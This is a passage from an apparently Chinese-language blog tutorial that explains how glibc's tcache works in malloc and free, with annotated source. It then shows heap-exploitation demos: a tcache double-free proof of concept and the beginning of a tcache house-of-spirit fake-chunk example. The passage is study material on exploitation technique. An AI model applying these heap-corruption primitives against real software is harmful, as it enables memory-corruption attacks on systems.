csize2tidx (tbytes);  <span class="comment">// 根据大小 tbytes ， 找到 tcache-&gt;entries 索引</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 如果 tcache-&gt;entries[tc_idx] 有 chunk ，就返回</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">// 调用 tcache_get 拿到 chunk 然后返回</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>首先判断 <code>tcache-&gt;entries[tc_idx]</code> 里面有没有 <code>chunk</code> ，如果有就直接返回，否则进入 <code>_int_malloc</code> 分配内存。</p><p>下面看看 <code>_int_malloc</code> （主要看 <code>tcache</code> 处理的部分）</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><h4 id="处理fastbin"><a href="#处理fastbin" class="headerlink" title="处理fastbin"></a>处理fastbin</h4><p>首先是把 请求的 <code>size</code> 转换成 实际 <code>malloc</code> 内部的 <code>size</code> ，然后定义了一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 fastbin里面移除 pp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line">  <span class="keyword">do</span>\</span><br><span class="line">    &#123;\</span><br><span class="line">      victim = pp;\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)\</span><br><span class="line"><span class="keyword">break</span>;\</span><br><span class="line">    &#125;\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line"> != victim);</span><br></pre></td></tr></table></figure><p>用于多线程的中从 <code>fastbin</code> 里面移除一个 <code>chunk</code>.</p><p>然后进入分配的流程， 首先如果 <code>size</code> 在 <code>fastbin</code> 的范围内进入， <code>fastbin</code> 分配的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)   <span class="comment">// 把该 fastbin 里面其他的 bin 放到 tcache 里面</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">// 判断 tcache 中指定 bin 中 chunk 是否超过 7</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>在 相应 <code>fastbin</code> 找到 合适的 <code>chunk</code> 后，就把 该 <code>chunk</code> 从 <code>fastbin</code> 里面拿下来</li><li>然后 把相应 <code>fastbin</code> 里面剩下的 <code>chunk</code> 全都放到 <code>tcache</code> 里面 ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满了 (已经有 <code>7</code> 个 <code>chunk</code> 了，即 <code>tcache-&gt;counts[tc_idx] = mp_.tcache_count = 7</code> ）。</li><li>最后在返回一开始拿到的 <code>chunk</code> 给用户</li></ul><p>如果 <code>fastbin</code> 不能分配，则进入 <code>smallbin</code> 的分配流程</p><h4 id="处理-smallbin"><a href="#处理-smallbin" class="headerlink" title="处理 smallbin"></a>处理 smallbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = bin;  <span class="comment">// 找到 chunk ， 从 smallbin拿下来准备返回给用户</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size, // 把指定 smallbin 里面的 bin扔到 tcache里面</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>和 <code>fastbin</code> 是类似的操作， 在 <code>size</code> 对应的 <code>smallbin</code> 里面找到 <code>chunk</code> 后</p><p>把这个 <code>chunk</code> 从链表上取下来</p><p>然后把该 <code>smallbin</code> 里面剩下的 <code>bin</code> 放入到 <code>tcache</code> ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满.</p><p>如果 <code>smallbin</code> 也没能分配，进入 <code>unsorted bin</code></p><h4 id="遍历unsorted-bin"><a href="#遍历unsorted-bin" class="headerlink" title="遍历unsorted bin"></a>遍历unsorted bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          <span class="comment">// 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">     <span class="comment">// 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历</span></span><br><span class="line"> We may <span class="keyword">return</span> one of these chunks later.  */</span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。</span></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">//如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit &gt; 0 默认为 0 ，不会进入分支, 继续遍历 </span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         &#125; <span class="comment">// end of  while ((victim = unsorted_chunks (av)-&gt;b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>在遍历 <code>unsorted bin</code> 的时候， 如果找到大小刚好满足的 <code>bin</code> ， 不会立刻返回，而是把这个 <code>bin</code> 放入 <code>tcache</code> 里面，并且设置 <code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code></li><li>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面</li><li>遍历 <code>unsorted bin</code> 的最后，会根据 <code>return_cached</code> 判断是否有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code> ， <code>mp_.tcache_unsorted_limit</code> 默认为 <code>0</code> ，所以不会进入分支， 这样就会把所有的 <code>unsorted bin</code> 都放入到 <code>tcache</code>。</li><li>遍历完 <code>unsorted bin</code> 后 ，根据 <code>return_cached</code> 判断 <code>tcache</code> 里面是否有合适的 <code>chunk</code> ，有的话就可以返回了</li><li>否则 <code>large bin</code> ，<code>top chunk</code> 来分配</li></ul><h2 id="tcache-in-free"><a href="#tcache-in-free" class="headerlink" title="tcache in free"></a>tcache in free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>删掉了一些没影响的代码</p><ul><li>首先就是获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就看 <code>tcache-&gt;counts[tc_idx]</code> 是否已经满了 ，如果没有满就直接放入 <code>tcache</code> ， 然后返回。</li><li>否则就和没有 <code>tcache</code> 是一样的处理</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk( next )</code> 的 <code>PREV_INUSE</code> 位，但是如果 <code>chunk</code> 被放入了 tcache ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">// 通过下一个 chunk 的 pre_inused 位，判断当前 chunk 释放已经被释放</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);  <span class="comment">// 如果 chunk 被放入了 tcache ，next-&gt;pre_inuse 不会被修改。</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>同时在 <code>malloc</code> 的时候 ，先尝试 <code>tcache</code> 分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>这也使得很多安全检测不会被执行。</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>通过 <code>free</code> 2次同一个 <code>chunk</code> ， 使得可以让两个指针分配到同一块内存</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">free</span>(p1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Next allocated memory will be same: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>通过 <code>_int_free</code> 的源码我们知道， 在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk</code> ( <code>next</code> ) 的 <code>PREV_INUSE</code> 位</li><li>然后如果 <code>tcache</code> 指定项没有满就把 <code>chunk</code> 加入 <code>tcache</code></li><li>但是如果 <code>chunk</code> 被放入了 <code>tcache</code> ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></li></ul><p>所以我们释放两次 <code>p1</code> , 此时 <code>tcache</code> 里面 <code>size</code> 为 <code>0x50</code> ( <code>chunk</code> 大小) 的项中就有 两个 一样 <code>chunk</code></p><p>然后分配两次一样大小的 <code>chunk</code>， <code>malloc</code> 会先用 <code>tcache</code> 分配，就会拿到两个一样的 <code>chunk</code></p><p>可以看到分配到了两个地址一样的 <code>chunk</code> .</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>通过伪造 <code>size</code> ，然后 <code>free</code> 掉这个 伪造的 <code>chunk</code> , 然后再分配 <code>size</code> 大小的 <code>chunk</code> , 就可以分配到指定位置。</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><p>首先看看源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> fake_chunk_and_more[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk_and_more, <span class="string">'A'</span>, <span class="keyword">sizeof</span>(fake_chunk_and_more));</span><br><span class="line">    <span class="built_in">printf</span>(<span 